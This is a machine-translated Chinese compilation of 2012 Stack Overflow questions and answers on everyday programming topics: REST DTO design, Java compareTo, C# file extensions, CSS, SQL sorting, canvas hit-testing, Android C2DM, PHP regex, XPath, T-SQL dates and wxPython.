根据数组的结构，有时查询/操作字符串而不是数组更容易（有时反之亦然）

# json - 在 RESTful Web 服务中，响应 DTO 是否应该包含其子 DTO？

> ID：10403540
> 
> 赞同：6
> 
> 时间：2012-05-01T20:02:18.323
> 
> 标签：json, web-services, rest, dto, saas

考虑具有名称和多个位置 (/users/{id}/locations) 的用户 (/users/{id})。

当我请求一个用户 (/user/{id}) 时，应该完整地表示该用户 - 它的 ID、名称和位置 - 还是应该只在单独的请求中返回位置？例如，对于 id=123 (/users/123) 的用户的请求，您希望使用哪个 JSON DTO：

1) { "id":123, "name":"Peter", "locations":[{"id":1, "name":"Chicago"}, {"id":2, "name":"纽约”}] }

2) { "id":123, "name":"Peter", "locations":[{"id":1}, {"id":2}] }

3) { "id":123, "name":"Peter", "locations":[1, 2] }

4) { "id":123, "name":"Peter" }

这是否更主观，在 DTO 的大小和典型用例中所需的请求之间推拉？我倾向于简单地包含所有相关数据 (1)，但我不确定这是否比仅要求开发人员多次调用 API 以获取他们真正想要的*所有数据更好。*

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-02T12:30:47.907

要成为 RESTful，您不一定必须返回资源的完整表示但是您确实希望启用超媒体作为获取/设置 API 用户所需的所有信息的手段（超媒体作为应用程序状态的引擎 - 也称为[HATEOAS](http://en.wikipedia.org/wiki/HATEOAS) )

为了满足这一点，您可以使用@bowmanb 的建议为所有位置放置一个 URI，或者为每个位置添加单独的 URI。您可能希望为使用资源执行某些操作的其他选项添加额外的 URI。

Jim Webber、Savas Parastatidis 和 Ian Robinson 有一篇关于 HATEOAS 的好文章，名为[“如何喝杯咖啡”](http://www.infoq.com/articles/webber-rest-workflow)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-02T00:48:30.460

我是这个世界的新手，但我正在构建一个宁静的 api 并面临完全相同的问题。我最初的工作是包括所有内容 - 所以我的结果看起来像你的选择 (1)。事实上，我更进一步，在每个对象中包含一个 URI，这样理论上，响应可以由足够智能的客户端导航。

话虽如此，我发现与您的“用户”对象等效的一个特定属性是巨大的。它似乎不会影响性能，但在我看来，没有客户想要关于该特定属性的所有信息——大多数客户只想要 id 和 name。因此，我将修改该属性的默认方法。

底线 - 在我的新手看来 - 决定是由客户的预期使用驱动的 - 客户希望看到什么？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-02T04:15:21.287

客户端应该有某种方法来确定如何找到用户的位置。所以我会排除4号。

如果您担心响应的大小，我相信仅包含用户位置的 URI 仍然是 RESTful：

```
{ "id":123, "name":"Peter", "locations":"/users/123/locations" } 
```

# java - compareTo：如何返回布尔值？

> ID：10403542
> 
> 赞同：1
> 
> 时间：2012-05-01T20:02:44.540
> 
> 标签：java

我被告知 compareTo 必须返回一个 int ......不是布尔值。
例如：

退货

0 如果 a 等于 b
-1 如果 a < b
+1 如果 a > b

我对此感到有些困惑。任何帮助将不胜感激。

```
public int compareTo(Cheese anotherCheese)
   throws ClassCastException
   {
       if (!(anotherCheese instanceof Cheese))
            throw new ClassCastException("A Cheese object expected.");

       if(getCheeseType().compareTo(anotherCheese.getCheeseType()))
            return -1;
       else if (getCheeseType().compareTo(anotherCheese.getCheeseType()))
            return 1;
       else
            return cheesePrice > anotherCheese.getCheesePrice();
   } 
```

编译时，我收到错误消息：

不
`if(getCheeseType().compareTo(anotherCheese.getCheeseType()))`
兼容的类型 不兼容的类型 不
`else if (getCheeseType().compareTo(anotherCheese.getCheeseType()))`
兼容的类型
`return cheesePrice > anotherCheese.getCheesePrice();`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-01T20:07:20.717

`compareTo`确实返回一个`int`，而不是一个`boolean`。因此，您会收到那些编译错误。在`if`语句中，您必须放置一个`boolean`.

所以而不是

`if(getCheeseType().compareTo(anotherCheese.getCheeseType()))`

写

`if(getCheeseType().compareTo(anotherCheese.getCheeseType()) < 0)`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T20:07:57.680

做就是了

```
return getCheeseType().compareTo(anotherCheese.getCheeseType()); 
```

如果您还想按价格进行比较，请执行

```
if(getCheeseType().compareTo(anotherCheese.getCheeseType())!=0)
    return getCheeseType().compareTo(anotherCheese.getCheeseType());
//cheeseTypes are equal
if(cheesePrice < anotherCheese.getCheesePrice())
    return -1;
else if (cheesePrice > anotherCheese.getCheesePrice())
    return 1;
else
    return 0; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-01T20:09:23.387

```
 // Order by type.
   int delta = getCheeseType().compareTo(anotherCheese.getCheeseType());
   if (delta != 0) { return delta; }
   // If of the same type, order by price.
   if (cheesePrice < anotherCheese.getCheesePrice()) { return -1; }
   if (cheesePrice > anotherCheese.getCheesePrice()) { return 1; }
   return 0; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-01T20:10:41.623

Yes`compareTo`方法将返回 int 类型，而不是`boolean`. 但是您`getCheeseType().compareTo(anotherCheese.getCheeseType())`在 if 循环中使用，这将导致编译时错误。像这样改变。

```
public int compareTo(Cheese anotherCheese)
   throws ClassCastException
   {
       if (!(anotherCheese instanceof Cheese))
            throw new ClassCastException("A Cheese object expected.");

       else return getCheeseType().compareTo(anotherCheese.getCheeseType()))

   } 
```

# c# - 如何减少 if 语句并将多个值传递给包含？

> ID：10403544
> 
> 赞同：0
> 
> 时间：2012-05-01T20:02:47.270
> 
> 标签：c#

假设我想遍历一个目录中的所有文件，并且如果该文件具有图像格式的扩展名，例如 jpeg、bmp 或 png，我想将该文件复制到另一个目录。`||`有没有一种方法可以在不链接在一起的情况下检查所有图像扩展名？这是一个例子：

代替：

```
if(file.Extension == ".jpg" || 
     file.Extension == ".jpeg" || 
     file.Extension == ".bmp" || 
     file.Extension == ".png")
            //Copy To Image directory 
```

我可以做类似的事情：

`if (file.Extension.Contains(...)).`

我知道 Contains 存在，但它不需要值数组（在这种情况下是扩展）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-01T20:05:05.600

```
List<string>validExtensions = new List<string>(){".jpg", ".jpeg" /* rest go here */ };
if(validExtensions.Contains(myFilenameExension))
{...} 
```

如果您有很多扩展，我会将其从 List 切换到 HashSet，但对于少量值（即 4），List 将相同或更快。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-01T20:05:44.350

创建一个集合类，如下所示：

```
List<string> validExtensions = new List<string>()
{
     ".jpg",
     ".jpeg",
     ".bmp",
     ".png"
}; 
```

然后做：

```
if (validExtensions.Any(ext=>file.Extension.Contains(ext)))
{
     //Do code.
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-01T20:06:09.670

```
List<string> extensions=new List<string>()
extensions.Add("jpg");
extensions.Add("png");
extensions.Add("mbp");

if(extensions.Contains(file.Extension)
{
 //do what you want
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-01T20:07:11.890

> if (file.Extension.Contains(...))

你想要相反的：

```
if(new [] {".jpg", /* etc */ ".png"}.Contains(file.Extension, StringComparer.InvariantCultureIgnoreCase))
{

} 
```

这是一种 LINQ 方法，因此请确保您有一个`using System.Linq`地方。另外，我通过了一个比较器，以便忽略大小写。似乎对于您正在做的事情，区分大小写不是您想要的。

# html - 导航链接在 Firefox 中工作但不是 Safari

> ID：10403545
> 
> 赞同：1
> 
> 时间：2012-05-01T20:02:48.637
> 
> 标签：html, css

我检查了我的 ul li，它们似乎写得正确，但由于某种原因，我的导航菜单中的链接只能在 Firefox 中使用，而不能在 safari 中使用。我对 css 相当陌生，如果我有输入代码的格式，我也很抱歉这里错了，这是我第一次问。谢谢！

这是我的html

```
<div id="container"> <a href="index.html"><img id="logo" src="img/yupi.png" width="300" /></a>

<div id="navigation">

<ul> 
<li> <a href="http://www.facebook.com"> Home </a> </li>
<li> <a href="about.html"> About </a> </li>
<li> <a href="products.html"> Products </a> </li>
<li> <a href="contact.html"> Contact </a> </li>
</ul>
</div>
<div class="clear">
</div>
<div id="slideshow">
<div class="active">
    <img src="img/city1.jpg" alt="Slideshow Image 1" />
   </div>

<div>
    <img src="img/city2.jpg" alt="Slideshow Image 2" />

</div>

<div>
    <img src="img/city3.jpg" alt="Slideshow Image 3" />

</div>

<div>
    <img src="img/city4.jpg" alt="Slideshow Image 4" />

</div> 
```

这是我的CSS

```
* {margin:0px;
padding:0px;
}
body {background-color:#00457D;
}
#container {
height:1000px;
width:1100px;
background-color:#FFF;
margin:0px auto;
-moz-box-shadow: 0 0 10px 3px #272727;
-webkit-box-shadow: 0 0 10px 3px #272727;
}
#logo {
padding-left:20px;
padding-top:50px;
}
#navigation { width:500px;
font-family:'Josefin Sans', Sans Serif;
font-size:25px;
margin-left:690px;
margin-top:-40px;
}
#navigation ul { list-style-type:none;
}
#navigation ul li {
border-right:solid #9C9E9F 1px;
float:left;
padding:0px 10px 0px 10px;
}
#navigation ul li a {
text-decoration:none;
color:#9C9E9F;
}
#navigation ul li a:hover {
color:#00457D;
}
#navigation li:last-child {
border-right:none;
}
.clear { clear:both;
}
#slideshow {
position:relative;
height:450px;
width:1100px;
}
#slideshow DIV {
position:absolute;
top:0;
left:0;
z-index:8;
opacity:0.0;
height: 100%;
width:100%;
background-color: #000;
margin-left:0px;
margin-top:50px;
}
#slideshow DIV.active {
z-index:10;
opacity:1.0;
}
#slideshow DIV.last-active {
z-index:9;
}
#slideshow DIV IMG {
height: 450px;
width:1100px;
display: block;
border: 0;
margin-bottom: 10px;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T20:22:57.093

我[在 jsFiddle 中创建了您网站的这个演示，](http://jsfiddle.net/Dy87J/show/)并在 Safari 中打开它。然后我用 DOM 开发者工具检查了它。

您的`div`呼叫`#slideshow`完全覆盖了您的菜单，从而阻止了单击链接的能力。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T20:07:56.413

相应地更新您的`a`标签：

```
#navigation ul li a {
text-decoration:none;
color:#9C9E9F;
display:block;
} 
```

通过浮动`li`你正在折叠它的高度。这应该可以解决问题。您还可以向`a`样式规则添加填充，以确保鼠标转换为不仅仅是文本上的指针。

# sql - SQL 对字符串和数字进行排序

> ID：10403546
> 
> 赞同：2
> 
> 时间：2012-05-01T20:02:51.707
> 
> 标签：sql

如果我有一个列表`1,2,3,4,5,K`并且我希望它像`K,1,2,3,4,5`我如何在 SQL 中那样进行排序？这些值是 SQL 表中唯一的值。这是在 MySQL 中，但也欢迎其他数据库。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-01T20:09:07.227

mysql中没有整数检测功能，所以你必须做这样的事情。假设您的列是 varchar 之类的，您可以像这样简单

```
ORDER BY CASE WHEN field REGEXP '^-?[0-9]+$' THEN field ELSE '0'+field END 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T20:06:27.460

如果您需要对 SELECT 的结果进行排序，那么您可能只需在 ORDER BY 语句中声明您的自定义排序规则。

这是一个例子：[http ://www.emadibrahim.com/2007/05/25/custom-sort-order-in-a-sql-statement/](http://www.emadibrahim.com/2007/05/25/custom-sort-order-in-a-sql-statement/)

这个想法是为每个项目分配您自己的优先级。

请记住，它可能取决于实际的 SQL 服务器。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-01T20:05:46.243

在 Oracle 中，您可以执行以下操作：

```
ORDER BY CASE WHEN column='K' THEN 0 ELSE TO_NUMBER(column) END 
```

其他系统大概也有类似的结构。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-01T20:07:02.877

这是在 SQLite 中工作的一个：

```
 select v1.* from (
   select t3.*, (case when value = 'K' then '0' else value end) normalized_val 
   from t3) v1 
 order by v1.normalized_val; 
```

# javascript - 检测弧内点击

> ID：10403548
> 
> 赞同：0
> 
> 时间：2012-05-01T20:02:55.777
> 
> 标签：javascript, html, canvas

如何检测在 HTML 画布元素中绘制的圆弧内的鼠标点击？

我正在创建这样的弧：

```
ctx.beginPath();
ctx.arc(250, 250, outsideRadius, angle, angle + arc, false);
ctx.arc(250, 250, 0, 0, 0, true);
ctx.fill(); 
```

我确实尝试为每个绘制的弧关联上下文对象，然后使用 myArc.ctx.isPointInPath(mouseX, mouseY) - 但这不起作用 - 所以我想使用基本三角函数来确定鼠标是否单击是否在界限内。

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T20:08:54.260

你应该使用

> ctx.isPointInPath(x, y);

我所做的是将beginPath，路径“绘图”移动到一个函数中，我也将其称为绘图，以及确定鼠标是否击中形状。

```
function shape() {
    ctx.beginPath();
    ctx.arc(250, 250, outsideRadius, angle, angle + arc, false);
    ctx.arc(250, 250, 0, 0, 0, true);
}

function draw() {
    shape();
    ctx.fill();
}

function checkHit(x, y) {
    shape();
    return ctx.isPointInPath(x, y);
} 
```

如果你像这样构建你的应用程序，添加其他形状也很容易

# android - c2dm 消息从未收到

> ID：10403549
> 
> 赞同：0
> 
> 时间：2012-05-01T20:02:59.767
> 
> 标签：android, android-c2dm

我很难通过 c2dm 接收消息。实际上，我偶尔会收到来自我们服务器的消息，但实际上只是数据的一半。（我期待一个 4 位数字，但只收到前 2 位数字.. oO"）。但是最近我们的广播接收器保持绝对沉默。因此我开始试验并将我自己的 c2dm 消息推送到谷歌服务器，看看情况如何是做。

在帖子的底部，您可以找到我如何发送和接收 c2dm 消息的示例类。这一切几乎都是独立的，因此您可以将其插入一些活动并拍摄`C2dmStaticTest.autopilot( yourSenderId, "foo bar", yourServerSideAuthCode, this, this.getPackageName());`

让我概述正在发生的事情：

*   设置要在 BroadcastReceiver 中使用的静态变量
*   注册广播接收器并设置动作和类别，`androidManifest.xml`否则它将如何。
*   向 c2dm 服务器发送注册意图。

注意：本地内置广播接收器将为每个接收到的意图生成一条日志消息！每次在类中发出日志消息时，标签都会是“c2dmTest”。

当收到带有 registration_id 的 c2dm 答案时，这也会被记录下来，然后会推送一条 c2dm 消息。
我在这里尽可能地模拟我们的服务器以获得更多控制权。作为回测，我还发出了一条模拟实际 Intent 的 fakeC2DM 消息，并测试广播接收器在 RECEIVE 操作上的功能。

虽然我可以从 c2dm 服务器接收注册令牌，但我没有收到我推送到服务器的任何消息。正如介绍中提到的，当我们的 Web 服务器发送消息时，我观察到相同的行为。

我尽了最大努力，我相信我已经相应地实现了广播接收器，并且由于消息发送的服务器响应代码始终为 200/OK，我也相信消息已成功传递到服务器。

然而结果不是预期的，但我真的缺乏任何想法我还能做什么。寻找诸如“无法保证消息传递”之类的段落也不令人鼓舞。我的意思是现在根本没有交付任何东西：C

```
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.util.Log;

public class C2dmStaticTest {

    private static String       RECEIVE         = "com.google.android.c2dm.intent.RECEIVE";
    private static String       REGISTER        = "com.google.android.c2dm.intent.REGISTER";
    private static String       REGISTRATION    = "com.google.android.c2dm.intent.REGISTRATION";

    private static Context      ctx;
    private static String       packageName;
    private static String       message;
    private static String       auth_code;

    private static IntentFilter mIntFilt        = new IntentFilter();

    //@formatter:off
    private static BroadcastReceiver mBroadRec = new BroadcastReceiver() {

        @Override
        public void onReceive( Context context, Intent intent ) {
            final String broadcastAction = intent.getAction();
            C2dmStaticTest.log("localReceiver onReceive for action: "+ broadcastAction);

            if (C2dmStaticTest.REGISTRATION.equals(broadcastAction)) {
                //execution continues here upon arrival of registration_id
                String registration_id = intent.getStringExtra("registration_id");
                C2dmStaticTest.log("registered for c2dm.\n key is: "+registration_id);

                C2dmStaticTest.log("==> start real self test");
                selfTestC2DM(registration_id, message, auth_code);
                C2dmStaticTest.log("<== real self test done");

                C2dmStaticTest.log("==> start fake test");
                selfTestFake();
                C2dmStaticTest.log("<== fake test done");

                C2dmStaticTest.log("<~~ bye");

            } else if (C2dmStaticTest.RECEIVE.equals(broadcastAction)) {
                C2dmStaticTest.log("Received message: " + intent.getStringExtra("message") );
            }
        }
    };
    //@formatter:on

    public static void autopilot( String sender_id, String message, String auth_code, Context ctx, String packageName ) {
        // setup static variables
        C2dmStaticTest.ctx = ctx;
        C2dmStaticTest.packageName = packageName;
        C2dmStaticTest.message = message;
        C2dmStaticTest.auth_code = auth_code;

        C2dmStaticTest.log("==> register broadcastReceiver");
        mIntFilt.addAction("com.google.android.c2dm.intent.RECEIVE");
        mIntFilt.addAction("com.google.android.c2dm.intent.REGISTRATION");
        mIntFilt.addCategory(packageName);
        ctx.registerReceiver(mBroadRec, mIntFilt);

        C2dmStaticTest.log("==> register for c2dm");
        C2dmStaticTest.registerForC2dm(ctx, sender_id);
        // will continue in localBroadCastReceiver on Receive for REGISTRATION
    }

    private static void registerForC2dm( Context ctx, String sender_id ) {
        Intent registrationIntent = new Intent(C2dmStaticTest.REGISTER);
        registrationIntent.putExtra("app", PendingIntent.getBroadcast(ctx, 0, new Intent(), 0)); // boilerplate
        registrationIntent.putExtra("sender", sender_id);
        ctx.startService(registrationIntent);
    }

    private static void selfTestFake() {
        Intent intent = new Intent();
        intent.setAction(C2dmStaticTest.RECEIVE);
        intent.putExtra("message", "Bender: \"kiss my shiny metal ass!\"");
        intent.addCategory(C2dmStaticTest.packageName);
        C2dmStaticTest.ctx.sendBroadcast(intent);
    }

    public static void selfTestC2DM( String registration_id, String message, String auth_code ) {

        // create HttpClient
        HttpClient mHttpClient = new DefaultHttpClient();

        // create HttpPost
        final HttpPost post = new HttpPost("https://android.apis.google.com/c2dm/send");
        post.addHeader("Content-Type", "application/x-www-form-urlencoded;charset=UTF-8");
        post.addHeader("Authorization", "GoogleLogin auth=" + auth_code);

        // set payload data ...
        final List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
        nameValuePairs.add(new BasicNameValuePair("registration_id", registration_id));
        nameValuePairs.add(new BasicNameValuePair("collapse_key", "foo"));
        nameValuePairs.add(new BasicNameValuePair("data.message", message));

        // ... and push it in the post
        try {
            post.setEntity(new UrlEncodedFormEntity(nameValuePairs));
        } catch (final Exception e) {
            e.printStackTrace(); // never had a problem here
        }

        // start it!
        try {
            HttpResponse resp = mHttpClient.execute(post);
            if (resp.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
                // now the message should be send, not?
                C2dmStaticTest.log("Message send.\nServer response: " + resp.getStatusLine().getStatusCode());
            } else {
                C2dmStaticTest.log("Unexpected Server response.\nServer response: " + resp.getStatusLine().getStatusCode());
            }
        } catch (final Exception e) {
            C2dmStaticTest.log("Unexpected Exception in execute()");
            e.printStackTrace();

        }
    }

    public static void log( String message ) {
        Log.d("c2dmTest", message);
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-03T19:45:25.810

好的，将其呈现给我们的服务器人员，我了解到这`status code: 200`仅表明通信成功，而不是数据可能存在语义错误。

在这种情况下，我实际上还收到了一个 JSONObject 说明键不匹配的错误。
这就是我所说的各级沟通问题...

# php - 特定 URL 结构的 preg_match

> ID：10403553
> 
> 赞同：1
> 
> 时间：2012-05-01T20:03:13.633
> 
> 标签：php, regex, preg-match

我正在尝试获取 URL 的一部分来创建嵌入代码。我有以下 URL 结构：

`http://www.mtv.com/videos/foster-the-people/761507/houdini.jhtml#id=1518072&amp;vid=761507`

我需要使用`preg_match`将 URL 分成几部分。理想情况下，我想测试 URL 的结构并从 URL 中获取数值。最终，我想要一个以下形式的数组`preg_match`：

```
Array (
    0 => 761507
    1 => 1518072
    2 => 761507
) 
```

请注意，“foster-the-people”和“houdini”是动态元素，可以包含字母、数字和“-”，并且会从 URL 变为 URL。

谢谢您的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T20:06:23.550

**试试这个：（**更新）

```
http:\/\/www\.mtv\.com\/videos\/.*?\/([0-9]+)\/.*?id=([0-9]+)&vid=([0-9]+) 
```

**演示：**

[http://regexr.com?30qo4](http://regexr.com?30qo4)

* * *

**代码 ：**

```
<?php
    $subject = "http://www.mtv.com/videos/foster-the-people/761507/houdini.jhtml#id=1518072&vid=761507";
    $pattern = '/http:\/\/www\.mtv\.com\/videos\/.*?\/([0-9]+)\/.*?id=([0-9]+)&vid=([0-9]+)/';
    preg_match($pattern, $subject, $matches);
    print_r($matches);

?> 
```

**输出 ：**

```
Array
(
    [0] => http://www.mtv.com/videos/foster-the-people/761507/houdini.jhtml#id=1518072&vid=761507
    [1] => 761507
    [2] => 1518072
    [3] => 761507
) 
```

* * *

**提示：**您需要的元素`$matches[1]`是`$matches[2]`和`$matches[3]`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T20:15:10.347

I would suggest you to use [parse_url](http://php.net/manual/en/function.parse-url.php) first to break your URL into individual components and then if needed use preg_match to get individual sub-items from `$urlarr['query']` where `$urlarr` is return value of parse_url.

# java - Java：数组中的数组？

> ID：10403555
> 
> 赞同：0
> 
> 时间：2012-05-01T20:03:15.917
> 
> 标签：java, arrays

我想知道我是否可以在数组内有一个数组？我想不出办法来解释它。

```
 if (numOfPlayers >= 2) {
          this.config.getString("Tribute_one_spawn");
          String[] onecoords = this.config.getString("Tribute_one_spawn").split(",");
          Player Tribute_one = (Player)this.Playing.get(0);
          World w = p.getWorld();
          double x = Double.parseDouble(onecoords[0]);
          double y = Double.parseDouble(onecoords[1]);
          double z = Double.parseDouble(onecoords[2]);
          Location oneloc = new Location(w, x, y, z);
          Tribute_one.teleport(oneloc);
          this.Frozen.add(Tribute_one);
          Tribute_one.setFoodLevel(20);
          this.config.getString("Tribute_two_spawn");
          String[] twocoords = this.config.getString("Tribute_two_spawn").split(",");
          Player Tribute_two = (Player)this.Playing.get(1);
          World twow = p.getWorld();
          double twox = Double.parseDouble(twocoords[0]);
          double twoy = Double.parseDouble(twocoords[1]);
          double twoz = Double.parseDouble(twocoords[2]);
          Location twoloc = new Location(twow, twox, twoy, twoz);
          Tribute_two.teleport(twoloc);
          this.Frozen.add(Tribute_two);
          Tribute_two.setFoodLevel(20);
        }
        if (numOfPlayers() >= 3) {
          this.config.getString("Tribute_three_spawn");
          String[] coords = this.config.getString("Tribute_three_spawn").split(",");
          Player Tribute_three = (Player)this.Playing.get(2);
          World w = p.getWorld();
          double x = Double.parseDouble(coords[0]);
          double y = Double.parseDouble(coords[1]);
          double z = Double.parseDouble(coords[2]);
          Location loc = new Location(w, x, y, z);
          Tribute_three.teleport(loc);
          this.Frozen.add(Tribute_three);
          Tribute_three.setFoodLevel(20);
        } 
```

如您所见，我必须在 if else 阶梯中为每个玩家创建一个新数组。除了制作 48 个 if 语句之外，还有一种方法可以更改 coords 数组的变量名称，以将其放入一个 for 循环中，其中计数器递增数组的名称。嗯，这是一种令人困惑的解释方式，但这是我能做的最好的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T20:09:59.720

简短的回答是肯定的，您可以声明一个类似的数组`String[][] playerCoords`，但是我建议查看[`Map`](http://docs.oracle.com/javase/7/docs/api/java/util/Map.html)界面，因为它可能更能描述您想要做什么。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T20:08:08.613

我不太确定我是否正确理解您，但您可能想要做一些类似二维数组的事情。看看这里：

[http://www.go4expert.com/forums/showthread.php?t=1162](http://www.go4expert.com/forums/showthread.php?t=1162)

它是这样分配的：

```
double[][] a2 = new double[10][5]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-01T20:19:52.873

您可以将代码包装在 for 循环中，前提是您可以重命名配置变量：

```
for (int i=1;i<numOfPlayers;i++) {
          String[] onecoords = this.config.getString().split(",");
          Player Tribute_i = (Player)this.Playing.get(i-1);
          World w = p.getWorld();
          double x = Double.parseDouble(onecoords[0]);
          double y = Double.parseDouble(onecoords[1]);
          double z = Double.parseDouble(onecoords[2]);
          Location oneloc = new Location(w, x, y, z);
          Tribute_i.teleport(oneloc);
          this.Frozen.add(Tribute_i);
          Tribute_i.setFoodLevel(20);
} 
```

您的配置变量将被命名为 Tribute_1_spawn、Tribute_2_spawn 等等......如果您需要进一步使用 Player 对象，您可以将它们保存在数组或其他数据结构中。

# xml - XPath根据返回多个值的子值选择元素？

> ID：10403556
> 
> 赞同：2
> 
> 时间：2012-05-01T20:03:25.647
> 
> 标签：xml, xpath

因此，我正在关注另一个问题的示例，我将在此处复制：

“试图根据其中一个孩子的孩子的价值来选择一个元素”

```
./book[author/name = 'John'] 
```

“想要所有作者姓名 = 'John' 的书

xml文件”

```
<list>
   <book>
      <author>
        <name>John</name>
        <number>4324234</number>
      </author>
      <title>New Book</title>
      <isbn>dsdaassda</isbn>
   </book>
   <book>...</book>
   <book>...</book>
</list> 
```

现在，无论出于何种原因，当我使用上面的 xpath 时，它确实选择了 book 节点，但它选择了所有节点，而不仅仅是 author = John 的那个节点。xpath 是否有理由忽略这一点而只是拉出每个书本节点？

我希望这是有道理的。谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T12:01:34.860

以下应该有效：

```
/list/book[author/name/. = 'John'] 
```

或者

```
/list/book[author/name/text() = 'John'] 
```

# sql - 与日期分开检索日、月和年

> ID：10403558
> 
> 赞同：0
> 
> 时间：2012-05-01T20:03:53.113
> 
> 标签：sql, sql-server-2008, tsql, date

是否有一种实现的方法可以从 T-SQL 中的日期字段中分别检索日、月和年？我发现的一切都是为了让这个过程反过来，就我而言，我的意思是如果我有 2012-05-22，我希望有 3 种不同的方法来分别获得 2012、05 和 22 的结果。

提前致谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-01T20:10:22.840

如果是 SQL Server，可以使用`DATEPART`（MSDN：http: [//msdn.microsoft.com/en-us/library/ms174420.aspx](http://msdn.microsoft.com/en-us/library/ms174420.aspx)）

例子：

```
DECLARE @yourDate DATETIME
SET @yourDate = '2012-05-22'

SELECT DATEPART(DAY, @yourDate), 
       DATEPART(MONTH, @yourDate),
       DATEPART(YEAR, @yourDate) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T20:12:11.077

如果您使用的是 mssql。你可以这样做：

```
DECLARE @date DATETIME
SET @date=GETDATE()
SELECT
    YEAR(@date) AS Years,
    MONTH(@date) AS MONTHs,
    DAY(@date) AS Days 
```

或者你可以使用`datepart`. 像这样：

```
DECLARE @date DATETIME
SET @date=GETDATE()
SELECT
    DATEPART(YEAR,@date) AS Years,
    DATEPART(MONTH,@date) AS MONTHs,
    DATEPART(DAY,@date) AS Days 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-01T20:07:29.313

我相信您可以将 date_format(DATEFIELD %M) 作为月份，将 date_format(DATEFIELD %b) 作为日期。

我在 Rails 应用程序中使用过类似的东西。

[http://www.w3schools.com/sql/func_date_format.asp](http://www.w3schools.com/sql/func_date_format.asp)

# php - php/javascript：使字符为一行添加颜色

> ID：10403560
> 
> 赞同：0
> 
> 时间：2012-05-01T20:03:58.490
> 
> 标签：php, javascript, textarea, str-replace

我想让它使字符**'>'和它后面的文本变成绿色**

并在我空间时恢复正常。

我认为这样做会起作用`$texts = str_replace(">","<em>>",$texts);`

然后用这个关闭它`$texts = '</em>' .nl2br($texts);`

问题是当我离开时一切都保持绿色。它似乎没有关闭。

它在文本区域中

我只是用作它的钩子。

我怎样才能使这项工作？我可以使用javascript吗？（我宁愿使用 php，但任何使它起作用的东西都很好）。

为了更清楚，粗体是绿色的。**> 这是绿色的**

现在这很正常，因为我按下回车并创建了一个新行。

# python - wxpython 演示实现

> ID：10403573
> 
> 赞同：1
> 
> 时间：2012-05-01T20:05:16.060
> 
> 标签：python, wxpython, demo

我是 python 的初学者，但我想使用 Python 的“按钮面板”演示代码编写一个简单的游戏。但是，我不确定如何将该代码从演示应用程序中取出并在我自己的应用程序中使用。具体来说，以下几行代码，我不知道如何替换。我意识到演示调用“父母”，我不知道该说什么来代替“父母。（某事）”：

```
class SettingsPanel(wx.MiniFrame):

    def __init__(self, parent, id=wx.ID_ANY, title="Settings Panel", pos=wx.DefaultPosition,
             size=wx.DefaultSize,
             style=wx.SYSTEM_MENU | wx.CAPTION | wx.CLOSE_BOX | wx.FRAME_NO_TASKBAR
             | wx.FRAME_FLOAT_ON_PARENT | wx.CLIP_CHILDREN):

        wx.MiniFrame.__init__(self, parent, id, title, pos, size, style)

        self.targetTitleBar = parent.titleBar
        self.parent = parent
        self.panel = wx.Panel(self, -1)
    self.coloursizer_staticbox = wx.StaticBox(self.panel, -1, "Colour Options")
    self.bottomsizer_staticbox = wx.StaticBox(self.panel, -1, "Size Options")
    self.stylesizer_staticbox = wx.StaticBox(self.panel, -1, "ButtonPanel Styles")
    self.defaultstyle = wx.RadioButton(self.panel, -1, "Default Style", style=wx.RB_GROUP)
    self.gradientstyle = wx.RadioButton(self.panel, -1, "Gradient Style")
    self.verticalgradient = wx.RadioButton(self.panel, -1, "Vertical Gradient", style=wx.RB_GROUP)
    self.horizontalgradient = wx.RadioButton(self.panel, -1, "Horizontal Gradient")

    b = self.CreateColourBitmap(wx.BLACK)

    self.bakbrush = wx.BitmapButton(self.panel, ID_BackgroundColour, b, size=wx.Size(50,25))
    self.gradientfrom = wx.BitmapButton(self.panel, ID_GradientFrom, b, size=wx.Size(50,25))
    self.gradientto = wx.BitmapButton(self.panel, ID_GradientTo, b, size=wx.Size(50,25))
    self.bordercolour = wx.BitmapButton(self.panel, ID_BorderColour, b, size=wx.Size(50,25))
    self.captioncolour = wx.BitmapButton(self.panel, ID_CaptionColour, b, size=wx.Size(50,25))
